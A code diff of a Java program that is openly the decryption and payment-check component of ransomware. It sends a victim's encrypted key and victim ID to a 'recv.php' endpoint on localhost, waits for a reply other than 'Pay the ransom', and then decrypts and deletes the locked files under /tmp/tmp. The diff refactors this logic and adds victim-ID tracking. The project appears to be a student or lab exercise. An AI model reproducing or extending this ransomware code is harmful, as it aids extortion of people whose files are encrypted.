@@ -1,41 +1,29 @@
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.security.NoSuchAlgorithmException;
+import java.security.spec.KeySpec;
 import java.util.ArrayList;
-import java.io.FileOutputStream;
 import java.util.Base64;
 import java.util.List;
 import java.util.stream.Stream;
-import javax.crypto.Cipher;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-import java.util.Arrays;
-import java.security.MessageDigest;
-import java.io.UnsupportedEncodingException;
-import javax.crypto.SecretKey;
-import javax.crypto.SecretKeyFactory;
-import java.security.spec.KeySpec;
-import javax.crypto.spec.PBEKeySpec;
 
-class secret {	
-	private static byte[] key;
+class secret {
 	private static SecretKeySpec secrets;
 	private static byte[] iV;
-	private static byte[] salt;
+
 	void setKey(String myKey) throws Exception{
-		MessageDigest sha = null;
 		//readig salt
 		FileInputStream saltFis = new FileInputStream("/tmp/tmp/salt.enc");
-		salt = new byte[8];
+		byte[] salt = new byte[8];
 		saltFis.read(salt);
 		saltFis.close();
 		FileInputStream ivFis = new FileInputStream("/tmp/tmp/iv.enc");
@@ -47,7 +35,7 @@ class secret {
 		SecretKey tmp = factory.generateSecret(keySpec);
 		secrets = new SecretKeySpec(tmp.getEncoded(), "AES");
 	}
-	void decryptFiles(int cipherMode, String key,String inputFile,String outputFile) throws Exception{
+	void decryptFiles(String inputFile, String outputFile) throws Exception{
 		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
 		cipher.init(Cipher.DECRYPT_MODE, secrets,new IvParameterSpec(iV));
 
@@ -74,26 +62,27 @@ class RansomwareDeactivate{
 	void decryptAllFiles(String key) throws Exception{
 		secret sec = new secret();
 		sec.setKey(key);
-		List<Path> fileNames = new ArrayList<Path>();
+		List<Path> fileNames = new ArrayList<>();
 		Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
 		paths.filter(Files::isRegularFile).forEach(fileNames::add);
 		Path salt_path = Paths.get("/tmp/tmp/salt.enc");
 		Path iv_path = Paths.get("/tmp/tmp/iv.enc");
 		Path key_path = Paths.get("/tmp/tmp/key.enc");
+		Path id_path = Paths.get("/tmp/tmp/id.enc");
 		fileNames.remove(salt_path);
 		fileNames.remove(iv_path);
 		fileNames.remove(key_path);
+		boolean remove = fileNames.remove(id_path);
 		for(Path file:fileNames){
 			try{	
 				System.out.println("Decrypting file: "+file.toString());
 				String inputFile = file.toString();
 				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
-				sec.decryptFiles(Cipher.DECRYPT_MODE, key, inputFile,outputFile);
+				sec.decryptFiles(inputFile,outputFile);
 				File f = new File(inputFile);
 				f.delete();
 			}
-			catch (Exception e){
-				continue;
+			catch (Exception ignored){
 			}
 		}
 	}
@@ -105,33 +94,43 @@ class decrypt {
 		ransomware.decryptAllFiles(ans);
 	}
 
-    static void validatePayment() throws Exception{
+    static boolean validatePayment() throws Exception{
         //ID is the victim's ID
-        int id = 1;
+        String id = encrypt.Identifier();
+        System.out.println(id);
         File file = new File("/tmp/tmp/key.enc");
-        String encoded_key = "";
-		String modifiedKey = "";
+        File file2 = new File("/tmp/tmp/id.enc");
+        String encoded_key;
+		String modifiedKey;
+		String encoded_id;
 		byte[] encKey = Files.readAllBytes(file.toPath());
-		encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
+		byte[] encid = Files.readAllBytes(file2.toPath());
+		encoded_key = Base64.getEncoder().encodeToString(encKey);
+		encoded_id = Base64.getEncoder().encodeToString(encid);
 		modifiedKey = encoded_key.replace('+', '-');
-		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
+		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+encoded_id);
 		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
 		con.setRequestMethod("GET");
 		con.addRequestProperty("Victim", "Yes");
 		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
 		String inputLine;
-		StringBuffer response = new StringBuffer();
+		StringBuilder response = new StringBuilder();
 		while((inputLine = in.readLine()) != null){
 			response.append(inputLine);
             }
 		in.close();
 		String ans = response.toString();
 		if(ans.equals("Pay the ransom")){
-			System.out.println("Pay the ransom first!");
-			System.exit(0);
+			return false;
 			}
-		else
-            activate(ans);
+		else if(ans == null){
+			return false;
+		}
+		else {
+			activate(ans);
+			cleanup();
+			return true;
+		}
     }
 
 	static void cleanup() throws Exception{
@@ -143,8 +142,7 @@ class decrypt {
 		f.delete();
 	}
 
-	public static void main(String[] args) throws Exception{
-		validatePayment();
-		cleanup();
+	public static boolean main(String[] args) throws Exception{
+		return validatePayment();
 	}
 }
